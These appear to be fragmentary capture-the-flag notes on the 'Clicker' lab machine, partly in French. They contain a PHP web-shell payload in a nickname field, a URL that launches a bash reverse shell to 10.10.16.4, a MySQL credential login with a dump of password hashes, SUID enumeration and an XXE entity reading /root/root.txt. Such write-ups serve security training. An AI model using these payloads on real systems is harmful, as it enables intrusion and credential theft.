```
POST /export.php HTTP/1.1
Host: clicker.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://clicker.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5796.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Referer: http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_r0zijfpm.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jvc17lebj77srumh73995mupjv
dnt: 1
Connection: close

threshold=1000000&extension=txt
```


```
http://clicker.htb/exports/top_players_jp8dybo5.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.4/9001%200%3E%261%22

```


```
On utilise ceci pour se connecter à mysql
```

```
mysql -u USERNAME -pPASSWORD -h HOSTNAMEORIP DATABASENAME
```

We have this
```
mysql -u clicker_db_user -pclicker_db_password -h localhost clicker
```

We entered !
```
mysql>
```

Let's make some commands in order to have information
```
mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| clicker            |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> USE clicker;
USE clicker;
Database changed

SHOW TABLES;
SHOW TABLES;
+-------------------+
| Tables_in_clicker |
+-------------------+
| players           |
+-------------------+
1 row in set (0.00 sec)


mysql> SELECT * FROM players;
SELECT * FROM players;
+---------------+--------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| username      | nickname                       | password                                                         | role  | clicks             | level     |
+---------------+--------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| admin         | admin                          | ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82 | Admin | 999999999999999999 | 999999999 |
| ButtonLover99 | ButtonLover99                  | 55d1d58e17361fe78a61a96847b0e0226a0bc1a4e38a7b167c10b5cf513ca81f | User  |           10000000 |       100 |
| napoknot21    | <?php system($_GET['cmd']); ?> | f6f3ef4115b06253b268ca9008b3887ad7a779c2a006525033abecd570fa6bc5 | Admin |            2776355 |       100 |
| Paol          | Paol                           | bff439c136463a07dac48e50b31a322a4538d1fac26bfb5fd3c48f57a17dabd3 | User  |            2776354 |        75 |
| Th3Br0        | Th3Br0                         | 3185684ff9fd84f65a6c3037c3214ff4ebdd0e205b6acea97136d23407940c01 | User  |           87947322 |         1 |
+---------------+--------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
5 rows in set (0.01 sec)
```

We see that we have the password of admin
```
ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82
```

Follwing the code of the page, the password is hashed in sha256, let's make a bruteforce 


It's complicate to get this info, so no this 03:06


Let's enumerate the system
```
find / -perm -4000 2> /dev/null
```

We have this output
```
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```

All seems to be normal, except with `/opt/manage/execute_query` ! Let's take a look

```
file /opt/manage/execute_query
```

It's a binary ! let's deep into it 
```
www-data@clicker:/opt/manage$ ls -la
ls -la
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21  2023 .
drwxr-xr-x 3 root root  4096 Jul 20  2023 ..
-rw-rw-r-- 1 jack jack   256 Jul 21  2023 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
www-data@clicker:/opt/manage$ cat README.txt
```

Let's read the README

```
cat README.txt
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
```

Now, try to



```
<?xml version="1.0"?>
<data>
  <timestamp>1707103184</timestamp>
  <date>2024/02/05 03:19:44am</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1173</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:26567</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>a59cb28218b44bcb847ad79007749ae1</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```


```
HTTP/1.1 200 OK
Date: Mon, 05 Feb 2024 03:10:31 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 796
Connection: close
Content-Type: text/html; charset=UTF-8

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/root.txt"> ]>
<data>&example;</data>

```
